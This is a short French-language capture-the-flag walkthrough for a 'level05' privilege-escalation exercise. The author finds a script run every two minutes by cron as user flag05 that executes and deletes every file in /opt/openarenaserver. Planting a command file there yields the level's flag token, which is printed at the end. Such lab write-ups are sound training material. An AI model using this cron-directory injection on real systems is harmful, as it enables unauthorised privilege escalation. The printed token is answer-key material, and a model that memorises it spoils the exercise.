$ ls -la
rien

$ find / -user level05 2> /dev/null 
rien

$ find / -user flag05 2> /dev/null |
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

$ ls -l /usr/sbin/openarenaserver; ls -l /rofs/usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver

$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

le code nous dit :
- boucle sur tous les fichiers de /opt/openarenaserver/ 
- set le limite de temps CPU a 5 secondes
- execute le fichier en cours
- supprime le 

on peut creer des fichiers dans /opt/openarenaserver/ on me peux cependant pas l'executer nous meme:
$ echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05

$ /usr/sbin/openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied

Neanmoins en executant les commandes suivantes:
$ find / -name level05 2> /dev/null 
/var/mail/level05
/rofs/var/mail/level05

$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

on apprends qu un cron execute le script automatiquement toutes les deux minutes:

On recommance et on attends:
$ echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc